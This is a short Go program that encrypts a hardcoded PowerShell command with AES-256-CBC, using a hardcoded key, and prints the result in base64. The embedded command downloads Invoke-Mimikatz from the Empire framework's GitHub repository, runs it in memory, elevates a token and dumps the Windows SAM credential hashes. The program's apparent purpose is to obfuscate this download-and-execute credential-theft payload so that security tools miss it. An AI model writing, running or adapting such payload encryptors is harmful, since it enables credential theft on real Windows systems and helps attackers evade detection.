package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
)

func main() {
	// Key for AES encryption (32 bytes for AES-256)
	key := []byte("supersecretkey123456789012345678") // 32 bytes key for AES-256

	// Message to be encrypted
	message := `IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`

	// Encrypt the message
	encrypted, err := aesEncrypt([]byte(message), key)
	if err != nil {
		fmt.Println("Error encrypting:", err)
		return
	}

	// Output the encrypted message as base64
	fmt.Println("AES Encrypted (Base64):", base64.StdEncoding.EncodeToString(encrypted))
}

// aesEncrypt encrypts plaintext using AES in CBC mode with PKCS7 padding
func aesEncrypt(plaintext []byte, key []byte) ([]byte, error) {
	// Create AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Apply padding (PKCS7 padding)
	padding := aes.BlockSize - len(plaintext)%aes.BlockSize
	paddedText := append(plaintext, byte(padding))
	for i := 1; i < padding; i++ {
		paddedText = append(paddedText, byte(padding))
	}

	// Generate a new IV (initialization vector)
	ciphertext := make([]byte, aes.BlockSize+len(paddedText)) // Allocate space for IV + padded plaintext
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Encrypt the message using AES in CBC mode
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], paddedText)

	return ciphertext, nil
}
